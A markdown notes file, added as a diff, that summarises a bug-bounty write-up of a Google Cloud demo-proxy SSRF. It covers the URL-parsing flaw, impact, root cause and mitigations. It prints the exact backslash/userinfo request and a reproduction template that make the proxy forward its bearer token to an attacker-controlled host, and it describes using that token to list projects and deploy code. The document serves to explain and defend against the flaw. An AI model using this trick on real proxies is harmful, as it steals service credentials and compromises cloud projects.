@@ -1,0 +1,156 @@
+# Fixing the Unfixable — Story of a Google Cloud SSRF (notes)
+
+**Source:** writeup by David Hu (bugs.xdavidhu.me). ([bugs.xdavidhu.me][1])
+
+---
+
+## TL;DR
+
+A product-page demo proxy (`cxl-services.appspot.com`) that forwards requests to Google Cloud APIs allowed an attacker to bypass the proxy’s hostname whitelist using URL-parsing differences (the “backslash-trick”). The attacker tricked the proxy into fetching an attacker-controlled host while the proxy still attached a valid authorization header for the targeted API. Using the stolen OAuth access token the researcher enumerated accessible GCP projects and resources, discovered logs and container images in Cloud Storage, and was even able to deploy a new App Engine service into the `cxl-services` domain — effectively demonstrating remote code execution in the App Engine service context. The writeup discusses the triage and remediation process and lessons learned. ([bugs.xdavidhu.me][1])
+
+---
+
+## Affected component / scope
+
+* A Google App Engine-hosted proxy used by interactive product demos (domain `cxl-services.appspot.com`) which accepts a `url` query parameter and proxies requests to that URL. ([bugs.xdavidhu.me][1])
+* The proxy implemented a hostname whitelist (allowed list) to restrict destinations (e.g., `jobs.googleapis.com`, `texttospeech.googleapis.com`), but the whitelist validation and the outgoing-request logic parsed attacker-supplied URLs differently, enabling an SSRF. ([bugs.xdavidhu.me][1])
+
+---
+
+## High-level vulnerability summary
+
+* The proxy accepted a `url` query parameter and validated the hostname against a whitelist.
+* Because URL parsing has multiple standards/implementations (WHATWG URL standard vs RFC3986), it’s possible for the validator and the HTTP client to interpret the same input string differently.
+* The researcher exploited that difference with a crafted URL using an `@` symbol and a backslash (`\`) to cause the whitelist check to believe the hostname was an allowed Google API host (e.g., `jobs.googleapis.com`), while the actual HTTP client resolved the request to an attacker-controlled host. This allowed the proxy to send requests that included the proxy’s own authentication token to the attacker-controlled server. ([bugs.xdavidhu.me][1])
+
+---
+
+## The exact trick used (backslash / userinfo confusion)
+
+* Example request used:
+
+  ```
+  GET /proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/ HTTP/1.1
+  Host: cxl-services.appspot.com
+  ```
+* The whitelist validator parsed the URL (likely following RFC3986) and treated `sfmnev.vps.xdavidhu.me` as userinfo, leaving `jobs.googleapis.com` as the hostname (thus allowed).
+* The HTTP client (or another parser used when performing the actual outbound request), following WHATWG rules, interpreted the backslash as ending the host authority and treated the host as `sfmnev.vps.xdavidhu.me`. The outbound request therefore went to the attacker server while the proxy still included its `Authorization: Bearer <token>` header. ([bugs.xdavidhu.me][1])
+
+---
+
+## What the researcher observed and stole
+
+* The attacker-controlled webserver received full HTTP requests that included the proxy’s authorization header (a valid OAuth 2.0 access token tied to the `cxl-services` App Engine service account). The request headers showed `authorization: Bearer <token>` and other App Engine headers. ([bugs.xdavidhu.me][1])
+* With that token, the researcher could call various Google Cloud APIs as the service account:
+
+  * `projects.list` returned at least four GCP projects (`docai-demo`, `cxl-services`, `garage-staging`, `p-jobs`). ([bugs.xdavidhu.me][1])
+  * Listing resources revealed Compute Engine VMs and a Cloud Storage bucket `cxl-services.appspot.com` containing hourly request logs dating back to 2017. The bucket `us.artifacts.cxl-services.appspot.com` contained App Engine artifacts/container images. ([bugs.xdavidhu.me][1])
+* The researcher was able to deploy a new App Engine service under `cxl-services.appspot.com` (a PoC service) using the stolen token, demonstrating code execution capability in the context of that App Engine project. The deployed URL was `https://vrp-poc-dot-cxl-services.appspot.com/`. ([bugs.xdavidhu.me][1])
+
+---
+
+## Impact
+
+* Confidentiality breach: exposure of service tokens and potentially sensitive logs and internal data in Cloud Storage.
+* Privilege misuse: stolen token permitted enumeration of projects and resources and allowed the researcher to deploy an App Engine service — effectively performing remote code execution in the context of the `cxl-services` project.
+* Broader risk: the proxy is used by many product demos; if abused at scale this technique could lead to wide data access or compromise of other demo contexts that rely on the same proxy/service account. ([bugs.xdavidhu.me][1])
+
+---
+
+## Reproduction summary (safe, high-level)
+
+* The vulnerability required:
+
+  * A proxy that accepts a `url` parameter and performs hostname allow-list validation separately from outbound request creation.
+  * A discrepancy between parsers used for validation and for outbound HTTP requests (WHATWG vs RFC3986 style differences).
+* Reproduction (summary, do not run against systems you do not own or without permission):
+
+  1. Point the proxy’s `url` parameter to a crafted URL of the form `https://attacker\@allowed-host/`.
+  2. If the proxy’s validator accepts the hostname but the outbound client resolves the host differently, the proxy will fetch the attacker-controlled host and forward authentication headers to it.
+  3. Capture and inspect the incoming request at the attacker host to retrieve the forwarded authorization header. ([bugs.xdavidhu.me][1])
+
+> Safety note: the original researcher limited active destructive actions, requested permission from Google before doing any data-changing tests, and documented ethical boundaries. Always follow safe testing guidelines and vendor disclosure policies. ([bugs.xdavidhu.me][1])
+
+---
+
+## Root cause (technical)
+
+* The vulnerability is a class of SSRF caused by inconsistent URL parsing between multiple components:
+
+  * Validator code used one URL parsing/normalization approach.
+  * HTTP client or sending code used another.
+* The proxy relied solely on a hostname-based allow list without canonicalizing/normalizing the attacker-supplied URL under the same parsing rules that the outbound request library uses.
+* When canonicalization/normalization differs between validation and usage, specially crafted inputs (userinfo sections, `@`, backslash characters, alternative encodings) can bypass validation while still being sent to an attacker-controlled host. ([bugs.xdavidhu.me][1])
+
+---
+
+## Researcher’s post-discovery actions & timeline (summary)
+
+* After confirming that the proxy forwarded an authorization header to the attacker-controlled host, the researcher used the token to enumerate accessible projects and resources and to confirm impact (listing projects, discovering buckets and container images, and demonstrating a PoC App Engine deployment). ([bugs.xdavidhu.me][1])
+* The researcher followed responsible disclosure: they documented actions and asked Google for permission before performing any modifications. The writeup includes a narrative about interactions with Google and the VRP, and the author nominated the writeup for the GCP VRP prize. The writeup also contains a detailed timeline and commentary about how the triage and patching process proceeded. ([bugs.xdavidhu.me][1])
+
+---
+
+## Mitigations and fixes (recommended / practical)
+
+For engineering teams who maintain proxies or URL-based forwarders:
+
+1. **Canonicalize and parse using a single, well-defined URL parser**:
+
+   * Use the same URL parsing logic for **both** validation and request construction.
+   * Prefer a canonical form that matches the HTTP client library’s resolution rules (test with edge cases such as `@`, `\`, `//`, unusual encodings, and userinfo). ([bugs.xdavidhu.me][1])
+2. **Avoid sending sensitive credentials on proxied requests unless strictly required**:
+
+   * Do not forward service account tokens or other high-privilege credentials to destinations that are influenced by user input.
+   * If outbound calls need authentication, prefer server-controlled allow-lists of pre-configured destinations (no user-supplied hostnames).
+3. **Use a strict allow-list that matches the actual outbound resolution and is based on destination addresses where possible**:
+
+   * Resolve and compare IP addresses to an expected set of ranges rather than relying only on textual hostname matching.
+   * When using allow-lists, check after DNS resolution and reject ambiguous or userinfo-laden inputs. ([bugs.xdavidhu.me][1])
+4. **Strip userinfo and other dangerous URL components** before making outbound calls.
+5. **Apply least privilege to service accounts**:
+
+   * Service accounts used for demo proxies should have the minimal scopes required (ideally only the API actions needed) and should not be able to enumerate or modify other projects/resources.
+6. **Logging & monitoring**:
+
+   * Monitor outbound requests and alert on unusual patterns (requests to unexpected hosts, newly seen destinations, or high-volume requests to a small set of non-Google hosts).
+7. **Pen-test/check for URL parser inconsistencies**:
+
+   * Include tests that simulate WHATWG vs RFC3986 parsing differences and other canonicalization edge cases. ([bugs.xdavidhu.me][1])
+
+---
+
+## Postmortem takeaways (researcher’s conclusions and lessons)
+
+* URL parsing is tricky; differences between standards and libraries are a persistent source of vulnerabilities.
+* Whitelists are useful but only if canonicalization and validation are performed in a manner consistent with how the request will be executed.
+* Sensitive tokens in outbound headers increase blast radius; decouple user-controllable inputs from any logic that causes privileged credentials to be sent.
+* Responsible disclosure and careful documentation (including asking permission before destructive actions) are essential when researchers discover tokens or resources in real infrastructure. ([bugs.xdavidhu.me][1])
+
+---
+
+## Proof of Concept (PoC) considerations
+
+* The author captured an `authorization` header from the proxied request and used the token to enumerate and access resources to demonstrate impact. The writeup contains a cautionary note and describes the researcher requesting permission before performing data-modifying operations. ([bugs.xdavidhu.me][1])
+* For public writeups: avoid publishing raw tokens or any steps that would allow others to reproduce destructive actions on live services. Provide high-level reproduction and defensive steps instead. ([bugs.xdavidhu.me][1])
+
+---
+
+## Suggested GitHub file name / metadata
+
+* Suggested file name: `notes/2021-12-31-google-cloud-ssrf-backslash-trick.md`
+* Suggested front-matter / tags:
+
+  * `title: Fixing the Unfixable — Google Cloud SSRF (backslash-trick)`
+  * `date: 2021-12-31`
+  * `severity: high`
+  * `status: disclosed / patched` (confirm with vendor bulletin if you need absolute proof)
+  * `references: [xdavidhu writeup]`
+
+---
+
+## References
+
+* Primary writeup: “Fixing the Unfixable: Story of a Google Cloud SSRF” — David Hu. Full narrative, request/response logs, header dumps, and timeline. ([bugs.xdavidhu.me][1])
+
+[1]: https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/ "Fixing the Unfixable: Story of a Google Cloud SSRF - bugs.xdavidhu.me"
